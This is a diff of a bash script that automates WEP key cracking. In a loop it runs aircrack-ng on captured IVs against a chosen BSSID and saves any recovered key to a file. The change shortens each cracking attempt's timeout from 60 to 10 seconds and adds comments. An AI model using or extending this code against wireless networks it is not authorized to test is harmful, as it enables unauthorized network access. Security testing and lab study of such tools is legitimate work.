@@ -184,10 +184,11 @@ while true; do
   # while it works. The first try waits for MIN_IVS, then each try waits for IV_TARGET more IVs.
   if [[ -z "$try_pid" ]] && (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
     last_iv=$ivs
-    echo "    [*] trying the key at ${ivs} IVs (up to 60 s, in the background)..."
+    echo "    [*] trying the key at ${ivs} IVs (up to 10 s, in the background)..."
     # -n 128: a 13-character (104-bit) WEP key. -b: the capture can hold other networks.
-    # timeout: a failed try can brute-force for minutes; the next try waits for IV_TARGET more IVs.
-    timeout -k 5 60 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 &
+    # timeout: aircrack-ng keeps searching when the key is missing, so a failed try stops at 10 s (a found
+    # key takes under a second). -k 5: KILL if TERM is ignored. The next try waits for IV_TARGET more IVs.
+    timeout -k 5 10 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 &
     try_pid=$!
     track_pid "$try_pid"
   fi
